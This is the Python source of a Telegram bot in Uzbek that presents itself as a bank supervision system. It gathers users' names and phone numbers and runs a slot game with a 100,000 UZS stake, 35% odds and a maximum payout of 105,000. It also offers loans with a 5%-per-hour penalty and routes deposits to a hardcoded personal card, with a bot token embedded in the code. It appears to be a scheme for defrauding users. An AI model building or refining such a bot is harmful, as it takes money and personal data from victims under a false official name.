import asyncio
import logging
import random
import json
import os
import re
from datetime import datetime
from decimal import Decimal, ROUND_HALF_UP
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- 1. SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 8299021738
ADMIN_KARTA = "9860 6067 5582 9722"
DB_FILE = "bank_data.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- 2. PUL FORMATLASH (CHESTNIY MATEMATIKA) ---
def f_money(amount):
    return "{:,.2f}".format(float(amount)).replace(",", " ")

# --- 3. MA'LUMOTLAR BAZASI ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for uid in data:
                data[uid]['balance'] = Decimal(str(data[uid].get('balance', 0)))
                data[uid]['loan'] = Decimal(str(data[uid].get('loan', 0)))
            return data
    return {}

def save_db(data):
    to_save = {}
    for uid, val in data.items():
        to_save[uid] = val.copy()
        to_save[uid]['balance'] = float(val['balance'])
        to_save[uid]['loan'] = float(val['loan'])
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(to_save, f, indent=4, ensure_ascii=False)

users = load_db()

def get_u(uid):
    uid = str(uid)
    if uid not in users:
        users[uid] = {
            'name': '', 'phone': '', 'reg': False, 
            'balance': Decimal('0.0'), 'loan': Decimal('0.0'), 'loan_time': None
        }
    return users[uid]

# --- 4. QARZ VA FOIZ HISOBI ---
def get_finance(uid):
    u = get_u(uid)
    if not u['loan'] or u['loan'] <= 0:
        return Decimal('0.0'), Decimal('0.0'), Decimal('0.0')
    
    l_time = datetime.strptime(u['loan_time'], "%Y-%m-%d %H:%M:%S")
    passed_hours = (datetime.now() - l_time).total_seconds() / 3600
    
    penya = Decimal('0.0')
    if passed_hours > 12:
        penya = (u['loan'] * Decimal('0.05') * Decimal(str(passed_hours - 12))).quantize(Decimal('0.01'))
        
    total = (u['loan'] + penya).quantize(Decimal('0.01'))
    return u['loan'], penya, total

# --- 5. KLAVIATURALAR ---
def main_kb():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🎰 OMADLI O'YIN"), types.KeyboardButton(text="💰 BALANS"))
    builder.row(types.KeyboardButton(text="✨ TEZKOR QARZ OLISH ✨"))
    builder.row(types.KeyboardButton(text="💳 DEPOZIT"), types.KeyboardButton(text="🏦 QARZNI YOPISH"))
    return builder.as_markup(resize_keyboard=True)

# --- 6. START VA REGISTRATSIYA (FAQAT TUGMA BILAN) ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    u = get_u(message.from_user.id)
    if not u['reg']:
        await message.answer("🏛 **BANKNAZORAT TIZIMI**\n\nIsm va Familiyangizni yuboring:")
    else:
        await message.answer("Xush kelibsiz!", reply_markup=main_kb())

@dp.message(lambda m: not get_u(m.from_user.id)['reg'] and not m.contact)
async def reg_process(message: types.Message):
    uid = str(message.from_user.id)
    if not users[uid]['name']:
        users[uid]['name'] = message.text
        kb = ReplyKeyboardBuilder().row(types.KeyboardButton(text="📱 RAQAMNI TASDIQLASH", request_contact=True))
        await message.answer("Endi raqamingizni tasdiqlang:", reply_markup=kb.as_markup(resize_keyboard=True))
    else:
        await message.answer("⚠️ Pastdagi tugmani bosing!")

@dp.message(F.contact)
async def reg_contact(message: types.Message):
    uid = str(message.from_user.id)
    if message.contact.user_id == message.from_user.id:
        users[uid]['phone'] = message.contact.phone_number
        users[uid]['reg'] = True
        save_db(users)
        await message.answer("✅ Muvaffaqiyatli ro'yxatdan o'tdingiz!", reply_markup=main_kb())
    else:
        await message.answer("❌ Faqat o'zingizning kontaktingizni yuboring!")

# --- 7. O'YIN (KIRISH: 100K, MAX YUTUQ: 105K) ---
@dp.message(F.text == "🎰 OMADLI O'YIN")
async def game_start(message: types.Message):
    u = get_u(message.from_user.id)
    bet = Decimal('100000.0')

    if u['balance'] < bet:
        return await message.answer(f"⚠️ Balans yetarli emas! O'yin narxi: {f_money(bet)} UZS")

    u['balance'] -= bet
    save_db(users)
    
    msg = await message.answer_dice("🎰")
    await asyncio.sleep(4)

    if random.random() < 0.35: # 35% yutish imkoniyati
        win = Decimal(str(random.uniform(101000, 105000))).quantize(Decimal('0.01'))
        u['balance'] += win
        await message.answer(f"🎉 G'ALABA!\n✅ Yutdingiz: +{f_money(win)} UZS\n💰 Balans: {f_money(u['balance'])} UZS")
    else:
        await message.answer(f"😟 Omad kelmadi.\n💸 Yo'qotildi: {f_money(bet)} UZS\n💰 Qolgan balans: {f_money(u['balance'])} UZS")
    save_db(users)

# --- 8. QARZ VA ADMIN TASDIQLASHI ---
@dp.message(F.text == "✨ TEZKOR QARZ OLISH ✨")
async def loan_menu(message: types.Message):
    u = get_u(message.from_user.id)
    if u['loan'] > 0: return await message.answer("🛑 Faol qarzingiz bor!")
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="💰 500 000 UZS", callback_data="get_500"))
    kb.row(types.InlineKeyboardButton(text="💰 1 000 000 UZS", callback_data="get_1000"))
    await message.answer("Kredit miqdorini tanlang:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("get_"))
async def get_loan(call: types.CallbackQuery):
    uid = str(call.from_user.id)
    amt = Decimal(call.data.split("_")[1]) * 1000
    users[uid]['loan'] = amt
    users[uid]['balance'] += amt
    users[uid]['loan_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_db(users)
    await call.message.edit_text(f"✅ {f_money(amt)} UZS hisobingizga tushdi!")

@dp.message(F.text.in_(["💳 DEPOZIT", "🏦 QARZNI YOPISH"]))
async def pay_start(message: types.Message):
    mode = "DEP" if "DEPOZIT" in message.text else "PAY"
    l, p, total = get_finance(message.from_user.id)
    if mode == "PAY" and total <= 0: return await message.answer("Qarzingiz yo'q.")
    
    users[str(message.from_user.id)]['wait_mode'] = mode
    txt = "To'lov summasini kiriting:" if mode == "DEP" else f"To'lov miqdori: {f_money(total)} UZS"
    await message.answer(f"💳 Karta: `{ADMIN_KARTA}`\n{txt}")

@dp.message(lambda m: get_u(m.from_user.id).get('wait_mode'))
async def pay_confirm(message: types.Message):
    uid = str(message.from_user.id)
    mode = users[uid].pop('wait_mode')
    try:
        amt = Decimal(re.sub(r'\D', '', message.text))
        kb = InlineKeyboardBuilder()
        kb.row(types.InlineKeyboardButton(text="✅ TASDIQLASH", callback_data=f"ok_{mode}_{uid}_{amt}"),
               types.InlineKeyboardButton(text="❌ RAD ETISH", callback_data=f"no_{uid}"))
        await bot.send_message(ADMIN_ID, f"📥 TO'LOV: {f_money(amt)}\n👤 Mijoz: {users[uid]['name']}", reply_markup=kb.as_markup())
        await message.answer("⌛️ Tekshirilmoqda...")
    except: await message.answer("Faqat raqam yozing!")

@dp.callback_query(F.data.startswith(("ok_", "no_")))
async def admin_res(call: types.CallbackQuery):
    d = call.data.split("_")
    status, mode, uid = d[0], d[1], d[2]
    amt = Decimal(d[3]) if len(d) > 3 else Decimal('0.0')
    if status == "ok":
        if mode == "DEP": users[uid]['balance'] += amt
        else: users[uid]['loan'] = Decimal('0.0'); users[uid]['loan_time'] = None
        save_db(users)
        await bot.send_message(uid, "✅ To'lov tasdiqlandi!")
    else: await bot.send_message(uid, "❌ To'lov rad etildi.")
    await call.message.edit_text(f"Natija: {status}")

# --- 9. BALANS ---
@dp.message(F.text == "💰 BALANS")
async def show_bal(message: types.Message):
    l, p, total = get_finance(message.from_user.id)
    u = get_u(message.from_user.id)
    await message.answer(f"👤 Mijoz: {u['name']}\n💵 Balans: {f_money(u['balance'])} UZS\n🛑 Qarz: {f_money(total)} UZS")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
